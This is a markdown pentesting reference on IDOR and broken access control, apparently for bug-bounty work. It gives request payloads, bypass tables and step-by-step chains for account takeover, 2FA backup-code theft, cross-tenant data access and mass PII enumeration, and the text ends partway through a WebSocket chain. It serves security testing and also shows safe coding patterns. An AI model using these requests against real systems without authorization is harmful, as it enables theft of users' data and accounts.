# IDOR — Insecure Direct Object Reference

## Overview

Insecure Direct Object Reference (IDOR) occurs when an application exposes internal
object identifiers (IDs, keys, filenames) and fails to verify that the requester has
permission to access the referenced object. It is the most common form of Broken Access
Control — OWASP #1 in both 2021 and 2025.

**Distinction:**
- **Horizontal escalation** — user A accesses user B's resources (same privilege level)
- **Vertical escalation** — low-privilege user accesses admin or elevated-privilege resources

**Impact:** Data exfiltration, account takeover, unauthorized modification or deletion,
financial fraud, PII exposure.

**Sources:**
- OWASP Top 10 A01:2021 — Broken Access Control
- PortSwigger Web Security Academy — Access control vulnerabilities
- HackerOne Hacktivity — Shopify IDOR ($25,000+), Twitter IDOR, multiple API IDOR reports

---

## Direct Object Reference Patterns

### Sequential Integers (Most Common)

```
GET /api/users/1001/profile
GET /api/orders/54321
GET /invoices/download?id=9982
GET /documents/3847/view

# Test: increment/decrement by 1, jump to low numbers (1, 2, 100)
GET /api/users/1000/profile   ← attacker's account
GET /api/users/1001/profile   ← victim (IDOR)
```

### GUIDs / UUIDs

```
GET /api/reports/550e8400-e29b-41d4-a716-446655440000

# UUID v1 is time-based and partially predictable
# UUID v4 is random — usually safe, but:
#   - May be leaked in other responses (email headers, logs exposed via info disclosure)
#   - May be guessable if seeded with low entropy
#   - Try enumerating GUIDs found in JS source, API responses, emails

# UUID v1 timestamp extraction:
python3 -c "import uuid; u=uuid.UUID('550e8400-e29b-11d4-a716-446655440000'); print(u.time)"
```

### Predictable Hashes

```
# MD5 of email — common pattern for "unsubscribe" or "avatar" links
https://target.com/avatar/d41d8cd98f00b204e9800998ecf8427e   # MD5 of ""
https://target.com/unsubscribe/5f4dcc3b5aa765d61d8327deb882cf99  # MD5 of "password"

# Brute-force with known email list:
import hashlib
emails = ['user@example.com', 'admin@target.com']
for e in emails:
    print(hashlib.md5(e.encode()).hexdigest(), e)
```

### Base64-Encoded IDs

```
# Decode, modify, re-encode
eyJ1c2VySWQiOiAxMDAxfQ==  →  {"userId": 1001}  →  {"userId": 1002}  →  eyJ1c2VySWQiOiAxMDAyfQ==

# Common decode targets
echo "eyJ1c2VySWQiOiAxMDAxfQ==" | base64 -d
# → {"userId": 1001}

# Re-encode modified value
echo -n '{"userId": 1002}' | base64
```

### Compound Keys and Indirect References

```
# Object referenced by combination of fields
GET /api/messages?from=1001&to=1002

# Indirect reference via association
GET /api/user/settings        ← user ID inferred from session
POST /api/transfer { "to_account": "ACC-9982" }   ← account number is the IDOR

# Filename-based
GET /files/2024/user_export_john_smith.csv
GET /reports/Q4_finance_internal.xlsx
```

---

## Horizontal Privilege Escalation

User A accesses or modifies resources belonging to User B at the same privilege level.

### Classic Examples

```http
# Access another user's profile
GET /api/users/1002/profile HTTP/1.1
Authorization: Bearer <User-A-Token>

# Download another user's invoice
GET /invoices/download?invoice_id=88821
Authorization: Bearer <User-A-Token>

# Read another user's messages
GET /api/conversations/9920/messages
Authorization: Bearer <User-A-Token>

# Edit another user's shipping address
PUT /api/addresses/44123
{"street": "Attacker St"}
Authorization: Bearer <User-A-Token>

# Access another user's OAuth tokens / connected apps
GET /api/users/1002/connected_accounts
```

### Two-Account Testing Procedure

```
1. Create Account A and Account B (different emails/sessions)
2. With Account A: create objects, note all IDs returned (orders, profiles, files, etc.)
3. With Account B: attempt to access Account A's object IDs
4. Record HTTP status (200 = IDOR, 403 = properly protected, 404 = obscured)
5. Repeat for every CRUD operation: GET, PUT/PATCH, DELETE, POST (to add associations)
```

---

## Vertical Privilege Escalation

A lower-privilege user accesses functionality or data restricted to higher roles.

### Parameter Tampering for Role Elevation

```http
# Account creation — try adding role field
POST /api/register
{"email": "a@evil.com", "password": "...", "role": "admin"}

# Profile update — mass assignment injection
PUT /api/users/1001
{"name": "Attacker", "role": "admin", "is_admin": true, "plan": "enterprise"}

# API call with undocumented admin parameter
GET /api/users?admin=true
GET /api/reports?include_all_users=true
DELETE /api/users/1001?force=true
```

### Accessing Admin Endpoints Directly

```
GET /admin/users
GET /admin/dashboard
GET /api/admin/logs
POST /api/admin/impersonate
GET /management/users
GET /internal/metrics

# Try with unprivileged session token — if no server-side role check, returns data
```

### Forced Browsing to Privileged Objects

```
# Typical pattern: app renders admin links only in UI, but no server-side check
GET /reports/all_users_export.csv    ← linked only in admin panel
GET /api/audit_log?all=true
GET /billing/summary?org=all
```

---

## Mass Assignment

Frameworks that auto-bind request body fields to model attributes allow injection of
privileged properties if not explicitly allowlisted.

### Common Vulnerable Attributes

```json
{
  "role": "admin",
  "is_admin": true,
  "is_verified": true,
  "email_verified": true,
  "balance": 99999,
  "credits": 9999,
  "plan": "enterprise",
  "subscription": "premium",
  "account_type": "staff",
  "permissions": ["read", "write", "admin"],
  "bypass_2fa": true
}
```

### Framework-Specific Notes

```ruby
# Rails — vulnerable pattern (params without strong parameters)
def create
  @user = User.new(params[:user])   # mass assignment vulnerability

# Safe (strong parameters)
def user_params
  params.require(:user).permit(:name, :email, :password)
end
```

```python
# Django REST Framework — vulnerable serializer
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'   # exposes all fields including is_staff, is_superuser

# Safe
fields = ['id', 'username', 'email']
```

```javascript
// Express + Mongoose — vulnerable
router.put('/user/:id', async (req, res) => {
  await User.findByIdAndUpdate(req.params.id, req.body);  // mass assignment
});

// Safe
const allowed = { name: req.body.name, email: req.body.email };
await User.findByIdAndUpdate(req.params.id, allowed);
```

---

## IDOR in REST APIs

### Parameter Location Coverage

```
# Path parameter
GET /api/v1/users/1001/orders

# Query string
GET /api/orders?user_id=1001&page=1

# Request body
POST /api/messages/send
{"recipient_id": 1002, "message": "hello"}

# Header
X-User-ID: 1001
X-Account-ID: ACC-9982

# Cookie
user_session=eyJ1c2VySWQiOiAxMDAxfQ==   ← contains userId, modify to 1002
```

### HTTP Method Testing

```http
# Try all methods on every endpoint even if only one is documented
GET    /api/users/1002   ← read
POST   /api/users/1002   ← create/trigger action
PUT    /api/users/1002   ← replace
PATCH  /api/users/1002   ← partial update
DELETE /api/users/1002   ← delete

# Also try:
HEAD   /api/users/1002   ← metadata leak
OPTIONS /api/users/1002  ← reveals allowed methods
```

### JWT Sub Claim Manipulation

```
# Decode JWT payload (middle section, base64)
eyJzdWIiOiAxMDAxLCAicm9sZSI6ICJ1c2VyIn0=
→ {"sub": 1001, "role": "user"}

# If server doesn't properly verify signature or trusts sub blindly:
# Modify sub to 1002, re-encode (alg:none attack or weak secret brute-force)
# Tools: jwt_tool, jwt.io

python3 jwt_tool.py <token> -T    # tamper mode
python3 jwt_tool.py <token> -X a  # alg:none attack
```

---

## IDOR in GraphQL

### Direct ID Arguments

```graphql
# Query another user's data by changing the id argument
query {
  user(id: 1002) {
    email
    phoneNumber
    paymentMethods {
      cardNumber
      expiry
    }
  }
}
```

### Introspection-Based Discovery

```graphql
# Enumerate all types and fields to find IDOR opportunities
query {
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Then test every query/mutation that accepts an id/userId/objectId argument
```

### Query Aliasing for Mass Enumeration

```graphql
# Fetch multiple users in one request using aliases
query {
  user1: user(id: 1001) { email }
  user2: user(id: 1002) { email }
  user3: user(id: 1003) { email }
  user4: user(id: 1004) { email }
}
```

### Mutation IDOR

```graphql
# Modify another user's object via mutation
mutation {
  updateUserProfile(userId: 1002, input: {
    email: "attacker@evil.com"
  }) {
    success
    user { email }
  }
}

# Delete another user's resource
mutation {
  deleteDocument(documentId: "DOC-9982") {
    success
  }
}
```

---

## Chaining IDOR with Other Vulnerabilities

### IDOR + Info Disclosure → Targeted Attack

```
1. IDOR on /api/users/{id} leaks email + phone
2. Use leaked PII for spear phishing or SIM swap
3. Bypass 2FA → full account takeover
```

### IDOR + Stored XSS → ATO

```
1. IDOR allows writing to another user's profile fields (PUT /api/users/1002)
2. Inject stored XSS payload into bio/name field
3. When admin reviews the profile → XSS fires in admin context → admin ATO
```

### IDOR + SSRF → Internal Pivot

```
1. IDOR on webhook configuration endpoint (PUT /api/webhooks/9982)
   → change webhook URL to attacker-controlled target or internal IP
2. Trigger the webhook → SSRF via legitimate-looking webhook delivery
3. Reach internal services via victim's webhook mechanism
```

### IDOR in Password Reset → ATO

```
1. Password reset generates token linked to user ID
2. IDOR: request reset for user A, intercept token, send reset for user B
   (if token is stored server-side without tying it to the requesting session)
3. Or: reset link endpoint /reset?token=X&user_id=1002 — swap user_id

Example flow:
POST /api/password/reset {"email": "victim@target.com"}
→ Token generated for user_id=1002

GET /reset?token=abc123&user_id=1002  ← attacker intercepts, changes 1002 to 1001
```

### IDOR + Race Condition

```
# Some apps check permission then act — race between check and action
1. Initiate a transfer for your own account
2. Race condition: before server validates, swap account_id in request
3. Transfer executes against target account

# Tools: Turbo Intruder, Burp Suite Repeater with parallel requests
```

---

## Testing Methodology

### Setup

```
1. Create two standard user accounts (Account A and Account B)
2. For privileged endpoint testing, also create one admin account if self-registration allows role selection
3. Capture all traffic with Burp Suite proxy
4. Build a sitemap of all endpoints and parameters using Spider + manual browsing
```

### Systematic Testing Steps

```
1. Map all IDs/references visible to Account A (object IDs, file IDs, report IDs)
2. Log in as Account B, attempt to access every ID from Account A's session
3. For each endpoint: test GET, PUT, PATCH, DELETE, POST with swapped IDs
4. Check request body, query params, path params, and headers for ID parameters
5. Test endpoints with no auth header at all → some endpoints have no auth check
6. Try deleted/deactivated object IDs → may bypass access controls if objects not fully removed
7. Test export and download endpoints — these are high-value and often overlooked
8. Test batch/bulk operations: {"ids": [1001, 1002, 1003]} → may return all if one belongs to you
9. Check pagination/listing endpoints for data leakage across users
10. Test state-change operations: mark as read, archive, delete — may affect other users' items
```

### Response Interpretation

```
200 OK + data from Account A → confirmed IDOR
200 OK + Account B's own data (no cross-access) → properly scoped
401 Unauthorized → no auth token was included (check your request)
403 Forbidden → server checked authorization, properly protected
404 Not Found → may be obscured IDOR (object exists but returns 404 to non-owners)
500 Internal Server Error → may indicate access reached the object but crashed — investigate further
```

---

## Common Endpoints and Parameters to Test

| Endpoint Pattern | Parameter | Notes |
|-----------------|-----------|-------|
| `/api/users/{id}` | path id | Profile data, PII |
| `/api/users/{id}/settings` | path id | 2FA, notification prefs |
| `/api/orders/{orderId}` | path id | Purchase history |
| `/api/invoices/{id}` | path id | Financial data |
| `/invoices/download?id=` | query id | File download |
| `/api/messages/{id}` | path id | Private messages |
| `/api/documents/{id}` | path id | Uploaded files |
| `/api/payment_methods/{id}` | path id | Card data |
| `/api/addresses/{id}` | path id | Personal info |
| `/api/admin/users` | — | Admin-only listing |
| `/api/reports/export` | `user_id`, `org_id` | Bulk data export |
| `/api/referrals/{code}` | path code | Referral credit manipulation |
| `/api/tokens/{id}/revoke` | path id | Revoke another user's session |
| `/api/tickets/{id}` | path id | Support ticket contents |
| `/api/webhooks/{id}` | path id | Webhook URL/secret |
| `/api/team/members/{id}` | path id | Team management |
| `/api/subscriptions/{id}` | path id | Billing plan |

---

## Detection Notes

- IDOR is authorization, not authentication — always include a valid auth token (just not the owner's)
- Low-severity IDOR (read-only, non-sensitive) → still reportable; focus on sensitive data or write-access for higher impact
- Use Burp's Autorize extension to automate IDOR testing across all requests with a second user's session cookie
- Check JavaScript source for hardcoded endpoints and object ID patterns not visible in normal app flow
- Test mobile app API traffic — mobile apps often expose undocumented API endpoints with weaker access control
- IDOR in admin panel → always higher severity, often leads to full platform compromise

---

## Advanced Patterns

### API Versioning Bypass

A very common pattern: developers add authorization checks to the new API version but
forget to deprecate or protect the old one.

```http
# v2 properly checks ownership:
GET /api/v2/users/1002/documents → 403 Forbidden

# v1 has no authorization check:
GET /api/v1/users/1002/documents → 200 OK (all documents returned)

# Also try:
GET /api/v0/users/1002/documents
GET /api/internal/users/1002/documents
GET /api/legacy/users/1002/documents
GET /api/mobile/users/1002/documents  # Mobile API endpoint often less hardened

# Common discovery: check JS bundles for old API paths,
# check Wayback Machine for deprecated endpoints
```

### State Machine / Workflow IDOR

Some objects can only be accessed in certain states. Skipping workflow steps via IDOR
allows accessing objects outside their intended state.

```http
# Normal flow: draft → submitted → approved → published
# IDOR: jump from draft directly to published state

# Step 1: Create draft (returns id=555)
POST /api/documents {"title": "test", "status": "draft"}
→ {"id": 555, "status": "draft"}

# Step 2: Skip approval — directly access another user's approved document:
GET /api/documents/approved/333   ← not your document, wrong state

# Step 3: Directly update state of another user's document:
PUT /api/documents/333/status {"status": "published"}
```

### Async Job / Export Queue IDOR

Background job IDs are often sequential and accessible before authorization is checked.

```http
# Trigger an export for your account:
POST /api/exports {"type": "user_data"}
→ {"job_id": "job_4521", "status": "pending"}

# Poll another user's job ID (sequential):
GET /api/exports/job_4520/status   ← someone else's export
GET /api/exports/job_4520/download ← download their data

# Common targets: data export, PDF generation, report scheduling, CSV download
```

### Tenant Isolation Failure (SaaS Multi-Tenancy)

```http
# Single-tenant API — user ID is scoped to tenant via JWT
# IDOR: modify org_id or tenant_id parameter to access another company's data

GET /api/org/tenant-abc/users HTTP/1.1
Authorization: Bearer <token for tenant-xyz>
→ If server doesn't validate token's org matches path param → data breach

# Also test:
POST /api/reports {"org_id": "target-tenant", "type": "all_users"}
GET /api/settings?company_id=competitor-org-id

# Header-based tenant confusion:
X-Tenant-ID: other-tenant
X-Organization-ID: other-org
```

### IDOR in 2FA / Backup Codes

```http
# 2FA backup codes often stored with user_id reference
GET /api/users/1002/2fa/backup-codes   ← another user's backup codes

# Reset another user's 2FA:
DELETE /api/users/1002/2fa
POST /api/users/1002/2fa/reset

# View another user's active sessions:
GET /api/users/1002/sessions

# Revoke another user's specific session:
DELETE /api/sessions/sess_abc123   ← session ID from IDOR in session listing
```

### Object-Level vs Field-Level IDOR

Object-level IDOR (full object access) is commonly tested. Field-level is often missed.

```http
# Object-level (commonly tested):
GET /api/users/1002 → returns all fields

# Field-level (often missed): object is your own, but field should be hidden
GET /api/users/1001    ← your own account
{
  "id": 1001,
  "email": "you@example.com",
  "salary": 95000,         ← should not be visible to self
  "internal_score": 82,   ← admin-only field returned to user
  "password_hash": "..."  ← should never be returned
}

# Test: compare fields returned to regular user vs admin
# Use Burp Comparer on two responses
```

### IDOR via HTTP Parameter Pollution

```http
# Some frameworks use first or last occurrence of a duplicate param
# Inject second user_id alongside your own to confuse server

GET /api/documents?user_id=1001&user_id=1002
# → If server uses last value: returns user 1002's documents
# → If server uses first value: returns user 1001's documents

# Works in: PHP ($_GET last value wins), Node (Express uses array or last),
#           Java (first value wins), ASP.NET (comma-joins values)

POST /api/transfer
user_id=1001&amount=100&user_id=1002
```

### Wildcard Parameter Injection

## Wildcard Parameter Injection
**Reference type:** Wildcard character  
**API pattern:** REST  
**Authorization flaw:** Backend processes `*`, `%`, `_`, or `.` as universal matchers and returns all records instead of rejecting the request; no ownership check is reached because the wildcard matches everything before auth logic fires.  
**Escalation:** Horizontal (mass enumeration)  
**Business impact:** Full user database or file listing exposed in a single request  
**Test payload:**
```http
GET /api/users/* HTTP/1.1
GET /api/users/%
GET /api/users/_
GET /api/files/.
GET /api/orders/*/details
Authorization: Bearer <any-valid-token>
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

---

## Content-Type Switching IDOR Bypass
**Reference type:** Any (numeric/GUID/hash)  
**API pattern:** REST  
**Authorization flaw:** Access control middleware is applied only to one content type (typically `application/json`). Switching to `application/xml`, `text/plain`, or `application/x-www-form-urlencoded` routes the request through a different handler or parser that skips the ACL check.  
**Escalation:** Horizontal / Vertical  
**Business impact:** Unauthorized read or write access to any object by evading content-type-specific authorization  
**Test payload:**
```http
# Original (blocked):
POST /api/users/1002/data HTTP/1.1
Content-Type: application/json
{"action": "read"}

# Bypass attempt 1 — switch to XML:
POST /api/users/1002/data HTTP/1.1
Content-Type: application/xml
<action>read</action>

# Bypass attempt 2 — switch to form-encoded:
POST /api/users/1002/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
action=read

# Bypass attempt 3 — text/plain (some frameworks skip validation):
POST /api/users/1002/data HTTP/1.1
Content-Type: text/plain
{"action": "read"}
```
**Source:** https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md

---

## Array Wrapping (Type Coercion IDOR)
**Reference type:** Numeric ID  
**API pattern:** REST (JSON body)  
**Authorization flaw:** Server-side authorization validates that a scalar `id` field belongs to the session user, but when the same value arrives as a single-element array the type check is bypassed — the framework either coerces it to a scalar silently or the ACL comparison evaluates to true before unpacking.  
**Escalation:** Horizontal  
**Business impact:** Access to any resource by sending `{"id":[victim_id]}` instead of `{"id": victim_id}`  
**Test payload:**
```http
# Original (blocked):
POST /api/documents/view HTTP/1.1
Content-Type: application/json
{"id": 1002}

# Bypass — wrap in array:
{"id": [1002]}

# Also try:
{"id": [1002, 1003, 1004]}   ← may return batch of other users' objects
{"user_id": [42]}
{"invoice_id": [88821]}

# JSON number → string coercion variant:
{"id": "1002"}   ← integer check skipped if server accepts strings
{"id": "1002.0"} ← floating point coercion
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

---

## File Extension Appending
**Reference type:** Path-based (filename / numeric)  
**API pattern:** REST  
**Authorization flaw:** Access control is applied to the base route (`/user_data/2341`) but the framework routes requests with appended extensions (`.json`, `.xml`, `.csv`) to a different controller or serializer that has no ACL middleware. Common in Rails, Laravel, and Express with route globbing.  
**Escalation:** Horizontal  
**Business impact:** Unauthorized access to another user's data by requesting an alternate serialized representation of the same object  
**Test payload:**
```http
# Original (blocked):
GET /api/user_data/2341 HTTP/1.1
→ 403 Forbidden

# Extension bypass:
GET /api/user_data/2341.json HTTP/1.1
GET /api/user_data/2341.xml HTTP/1.1
GET /api/user_data/2341.csv HTTP/1.1
GET /api/user_data/2341.html HTTP/1.1

# Also try on file download endpoints:
GET /invoices/88821.pdf HTTP/1.1   ← if /invoices/88821 returned 403
```
**Source:** https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md

---

## Parameter Name Substitution
**Reference type:** Numeric ID  
**API pattern:** REST  
**Authorization flaw:** The backend accepts multiple parameter names for the same underlying object (e.g., `album_id` and `collection_id` both map to the photo album table). The authorization check validates only the canonical parameter name; substituting an alias bypasses the check while still accessing the same object.  
**Escalation:** Horizontal / Vertical  
**Business impact:** Unauthorized access to objects via undocumented or aliased parameter names that lack authorization enforcement  
**Test payload:**
```http
# Discover the canonical param from normal app flow, then substitute:
# Canonical (blocked):
GET /api/photos?album_id=9982
→ 403 Forbidden

# Substitute aliases:
GET /api/photos?collection_id=9982
GET /api/photos?folder_id=9982
GET /api/photos?gallery_id=9982
GET /api/photos?id=9982

# In request body — try alternate names:
POST /api/messages/get
{"thread_id": 5001}      ← blocked
{"conversation_id": 5001} ← alias, may lack ACL

# Also: swap object-type prefix
GET /api/data?user_id=1002  → try GET /api/data?account_id=1002
```
**Source:** https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md

---

## WebSocket IDOR
**Reference type:** Numeric / GUID  
**API pattern:** WebSocket  
**Authorization flaw:** WebSocket connections authenticate at the handshake (HTTP Upgrade request) but perform no per-message object-level authorization. Once connected, resource IDs sent in message payloads are processed without verifying the connected user owns the referenced object.  
**Escalation:** Horizontal / Vertical  
**Business impact:** Real-time access to private data streams, chat messages, notifications, or live dashboards belonging to other users  
**Test payload:**
```
# Step 1: Establish WebSocket connection (auth happens here via cookie/token)
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Cookie: session=<your-session>

# Step 2: After connection, send message with another user's object ID
# Burp Suite: Proxy → WebSocket history → intercept and modify

# Subscribe to another user's notification stream:
{"action": "subscribe", "channel": "user_notifications", "user_id": 1002}

# Request another user's chat room:
{"type": "join_room", "room_id": "private_room_9982"}

# Fetch another user's live dashboard data:
{"event": "get_dashboard", "account_id": "ACC-1002"}

# Read another user's messages in real-time:
{"cmd": "fetch_messages", "conversation_id": 5001, "user_id": 1002}

# Tool: Burp Suite WebSocket tab, wscat for manual testing
# wscat -c wss://target.com/ws --header "Cookie: session=<yours>"
```
**Source:** https://portswigger.net/web-security/websockets

---

## GraphQL Subscription IDOR
**Reference type:** Numeric / GUID  
**API pattern:** GraphQL (Subscription over WebSocket)  
**Authorization flaw:** GraphQL subscription resolvers are implemented separately from query/mutation resolvers. Teams add ownership checks to queries and mutations but forget subscription resolvers — any authenticated user can subscribe to another user's event stream by supplying their `userId` or `objectId` argument.  
**Escalation:** Horizontal  
**Business impact:** Real-time exfiltration of another user's private events, order status, messages, or financial transactions  
**Test payload:**
```graphql
# Subscribe to another user's order updates:
subscription {
  orderUpdated(userId: "1002") {
    orderId
    status
    total
    shippingAddress { street city zip }
  }
}

# Subscribe to another user's notifications:
subscription {
  newNotification(userId: "1002") {
    message
    type
    timestamp
  }
}

# Subscribe to another user's chat messages:
subscription {
  messageReceived(conversationId: "conv_9982") {
    content
    sender { id email }
    sentAt
  }
}

# Discover subscriptions via introspection:
query {
  __schema {
    subscriptionType {
      fields { name args { name type { name } } }
    }
  }
}
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

---

## Pre-Signed Object Storage IDOR
**Reference type:** Filename / object key  
**API pattern:** REST (AWS S3, GCS, Azure Blob Storage)  
**Authorization flaw:** The API endpoint that *generates* a pre-signed URL checks only that the requester is authenticated, not that they own the requested object key. Any authenticated user can request a time-limited signed URL for any object key in the bucket, including files belonging to other users.  
**Escalation:** Horizontal  
**Business impact:** Access to private files, documents, medical records, financial exports, or user attachments stored in cloud object storage  
**Test payload:**
```http
# Step 1: Request a pre-signed URL for your own file (observe the object key pattern):
POST /api/files/presign HTTP/1.1
{"key": "uploads/user_1001/invoice_jan2026.pdf"}
→ {"url": "https://bucket.s3.amazonaws.com/uploads/user_1001/invoice_jan2026.pdf?X-Amz-Signature=..."}

# Step 2: Request a signed URL for another user's object key:
POST /api/files/presign HTTP/1.1
{"key": "uploads/user_1002/invoice_jan2026.pdf"}
→ If server returns a signed URL → IDOR confirmed

# Step 3: Fetch the file directly using the signed URL (no further auth needed)
GET https://bucket.s3.amazonaws.com/uploads/user_1002/invoice_jan2026.pdf?X-Amz-Signature=...

# Variations:
POST /api/download {"filename": "user_1002/export_2026.csv"}
GET /api/attachments/presign?key=tickets/ticket_9982/attachment.docx
POST /api/avatar/upload-url {"userId": 1002}   ← write IDOR via presign
```
**Source:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References

---

## Threat Model

> Current patterns as of 2026-05-24. Update each session.

**What's being exploited in the wild:**

1. **API versioning bypass** — The #1 underappreciated IDOR vector. v1/v0/internal/
   legacy/mobile endpoints consistently lack authorization that v2/v3 endpoints have.
   Accounts for a large percentage of high-severity HackerOne IDOR reports.

2. **GraphQL IDOR at scale** — As more APIs migrate to GraphQL, IDOR in mutations is
   extremely common. Developers implement query-level auth but forget mutation-level.
   Batch queries allow mass enumeration in a single request. GraphQL subscriptions are
   the newest blind spot — subscription resolvers routinely lack the ownership checks
   present in query/mutation resolvers.

3. **Bulk operations skip per-object auth** — `DELETE /api/items` with a body of IDs
   almost never validates each ID against the session. Affects archiving, exporting,
   tagging, and batch-status-change features.

4. **Tenant isolation in SaaS** — Multi-tenant SaaS platforms are a goldmine. org_id
   or company_id parameters passed in request body or headers — if not validated against
   JWT claims — allow cross-tenant data access. This is a critical vulnerability in B2B
   platforms.

5. **Mobile API lag** — Mobile apps often communicate with `/api/mobile/` or `/api/v1/`
   endpoints that have fewer auth checks than the web app's API. Always intercept mobile
   app traffic (use Frida or HTTP proxy on device) separately from web.

6. **WebSocket message-level IDOR** — WebSocket auth happens at handshake; per-message
   object-level checks are almost universally missing. Real-time apps (chat, trading,
   dashboards) built on WebSockets are systematically vulnerable. A valid session cookie
   is all you need to subscribe to any user's private data stream.

7. **Pre-signed object storage IDOR** — Cloud-native apps offload file delivery to S3/GCS
   signed URLs. The endpoint that generates the signed URL frequently checks authentication
   but not ownership of the object key. Any file key is accessible to any authenticated
   user. Common in document-sharing, invoicing, and healthcare SaaS platforms.

8. **Type coercion bypasses (array wrapping, content-type switching)** — Authorization
   middleware that validates a scalar `id` field will often pass when the same ID is
   wrapped in a JSON array (`[id]`) or when the content type is switched from JSON to
   XML/form-encoded. These simple one-character changes evade a surprising number of
   access control implementations.

---

## Bypass Matrix

| Protection Mechanism | Bypass Technique |
|---------------------|-----------------|
| Endpoint checks auth | Try older API version (v1, v0, /internal/, /legacy/) |
| UUID (hard to guess) | Find UUID in email, JS, API response body, or info disclosure |
| 403 on GET | Try PUT, PATCH, DELETE, POST on same path |
| 403 on path param | Try same ID in query string, request body, or header |
| Object scoped to org | Modify org_id / tenant_id / company_id param |
| Rate limited enumeration | Use GraphQL aliases to batch in one request |
| Authorization middleware | Try missing auth header entirely (some bypass auth entirely) |
| Per-object check on v2 | Same endpoint on v1/v0/internal/mobile |
| Sequential IDs monitored | Use existing leaked IDs from emails, JS, error messages |
| Response is 404 not 403 | Still attempt write methods (PUT/DELETE) — 404 may be fake |
| Scalar ID validation | Wrap ID in array: `{"id": [1002]}` — coercion bypasses ACL |
| JSON content-type check | Switch to XML, text/plain, or form-encoded body |
| Path-based ACL | Append file extension: `/resource/1002.json` instead of `/resource/1002` |
| Canonical param name ACL | Substitute alias: `album_id` → `collection_id`, `folder_id`, `id` |
| WebSocket session auth | Send victim's object ID in message body after your own handshake |
| GraphQL query/mutation ACL | Subscribe to victim's events via subscription resolver (often unprotected) |
| Presigned URL ownership | Request `/api/files/presign` with victim's object key |

---

## High-Value Targets

| Target | IDOR Type | Impact |
|--------|-----------|--------|
| `/api/admin/users` | Vertical | All user PII, role manipulation |
| `/api/org/{id}/members` | Tenant isolation | Competitor's org data |
| `/api/invoices/{id}/download` | Horizontal | Financial documents, PII |
| `/api/users/{id}/sessions` | Horizontal | Active session list → session fixation |
| `/api/exports/job_{id}` | Async queue | Data export of another user |
| `/api/v1/users/{id}` (vs v2) | API version | Unprotected legacy endpoint |
| GraphQL `deletePost(id:)` mutation | GraphQL | Delete another user's content |
| `/api/2fa/backup-codes` | Horizontal | Bypass 2FA → full ATO |
| `/api/webhooks/{id}` | Horizontal | Change webhook URL → SSRF |
| `/api/payment-methods/{id}` | Horizontal | Financial data, charge trigger |
| Batch delete `{"ids": [...]}` | Bulk | Cross-user deletion |
| `/api/team/invite/{token}` | Horizontal | Accept invite meant for others |
| `/api/files/presign` or `/api/download` | Pre-signed URL | Private file access (S3/GCS/Azure) |
| WebSocket `/ws` + message `user_id` | WebSocket | Real-time private data stream |
| GraphQL subscription `newNotification(userId:)` | GraphQL subscription | Live event stream exfiltration |
| `/api/users/*` wildcard | Wildcard injection | Mass user data exposure |
| Recently released feature endpoints | New feature | Immature access controls, highest ratio |

---

## Real-World Chains

### Chain 1: IDOR + API v1 Bypass → Full User Data Dump

```
1. Register as a standard user on a SaaS platform
2. Observe: GET /api/v2/users/1002 → 403 (properly protected)
3. Try: GET /api/v1/users/1002 → 200 (legacy endpoint, no auth check)
4. Discover v1 returns: email, phone, address, payment_method_last4, account_balance
5. Enumerate: GET /api/v1/users/1 through /1000 with Burp Intruder
6. Extract full PII database for all users

Impact: Critical — mass PII exposure
Report note: always check Wayback Machine and JS files for old API paths
```

### Chain 2: GraphQL Mutation IDOR → Account Takeover

```graphql
# 1. Discover updateUserEmail mutation via introspection
mutation {
  __type(name: "Mutation") { fields { name } }
}
# → finds: updateUserEmail(userId: ID!, email: String!): User

# 2. Normal use:
mutation { updateUserEmail(userId: "1001", email: "me@example.com") { success } }
# → 200 OK

# 3. IDOR: update another user's email
mutation { updateUserEmail(userId: "1002", email: "attacker@evil.com") { success } }
# → 200 OK (no ownership check on userId)

# 4. Trigger password reset for attacker@evil.com → attacker receives reset link
# 5. Reset password → full account takeover

Impact: Critical — ATO on any account
```

### Chain 3: IDOR in Async Export → Competitor Data Exfil

```
1. Request data export for your account:
   POST /api/exports {"type": "all_data"} → {"job_id": "export_9182"}

2. Notice job_id is sequential (or predictable)

3. Poll adjacent job IDs:
   GET /api/exports/export_9181/status → {"status": "complete", "owner": "acme-corp"}
   GET /api/exports/export_9181/download → Downloads acme-corp's full data export

4. No ownership check on the /download endpoint — any authenticated user can fetch any job

Impact: Critical — mass data exfiltration, B2B SaaS scenario
```

### Chain 4: Tenant IDOR → Cross-Org Data Access → Lateral Movement

```
1. Sign up for SaaS platform — receive JWT containing:
   {"sub": "user123", "org": "attacker-corp", "role": "admin"}

2. Test: GET /api/org/victim-corp/reports
   Authorization: Bearer <attacker-corp JWT>
   → Returns victim-corp's reports (org param not validated against JWT)

3. Read victim-corp's internal data → extract user list + contact info

4. Use contact info for spear phishing against victim-corp employees
   → Compromise victim-corp account → lateral movement within platform

Impact: Critical — cross-tenant data breach in SaaS
```

### Chain 5: IDOR on 2FA Backup Codes → ATO on High-Value Account

```
1. Find: GET /api/users/{id}/2fa/backup-codes (requires auth, but no ownership check)
2. Identify high-value target user ID (from public profile, API response, enumeration)
3. Fetch their backup codes:
   GET /api/users/42/2fa/backup-codes → ["XXXX-YYYY", "AAAA-BBBB", ...]
4. Try to log in as victim (need their email — find via another IDOR or info disclosure)
5. Use backup code when 2FA is requested → bypasses 2FA
6. Full account takeover even with 2FA enabled

Impact: Critical — complete bypass of 2FA protection
```

### Chain 6: WebSocket IDOR → Real-Time Private Data Exfiltration

```
1. Open Burp Suite, enable WebSocket interception
   Navigate to the real-time feature (live chat, dashboard, trading view)

2. Observe the WebSocket handshake:
   GET /ws HTTP/1.1
   Cookie: session=<your-session>
   → Connection established

3. Observe initial subscription message sent by client:
   {"action": "subscribe", "channel": "user_feed", "user_id": "1001"}
   → Server responds with your real-time events

